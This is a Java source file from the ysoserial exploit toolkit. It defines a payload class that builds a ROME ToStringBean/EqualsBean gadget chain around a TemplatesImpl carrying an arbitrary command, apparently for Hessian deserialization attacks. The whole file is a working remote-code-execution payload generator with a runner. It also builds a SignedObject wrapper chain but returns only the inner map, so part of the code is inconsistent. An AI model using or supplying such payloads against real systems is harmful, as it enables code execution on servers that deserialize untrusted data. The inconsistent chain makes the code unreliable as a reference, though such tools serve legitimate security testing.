package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

@Dependencies({"rome:rome:1.0","com.caucho:hessian:4.0.38"})
@Authors({ Authors.F4NX1NG })
public class HessianSignedObject implements ObjectPayload<Object>{

    public Object getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        EqualsBean equalsBean = new EqualsBean(String.class,"fanxing");
        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean,"aaa");
        Reflections.setFieldValue(equalsBean,"_beanClass",ToStringBean.class);
        Reflections.setFieldValue(equalsBean,"_obj",toStringBean);

        //SignedObject
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
        ToStringBean toStringBean_sign=new ToStringBean(SignedObject.class,signedObject);
        EqualsBean equalsBean_sign=new EqualsBean(String.class,"fanxing");
        HashMap hashMap_sign = new HashMap();
        hashMap_sign.put(equalsBean_sign,"aaa");
        Reflections.setFieldValue(equalsBean_sign,"_beanClass",ToStringBean.class);
        Reflections.setFieldValue(equalsBean_sign,"_obj",toStringBean_sign);

        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(HessianSignedObject.class, args);
    }
}
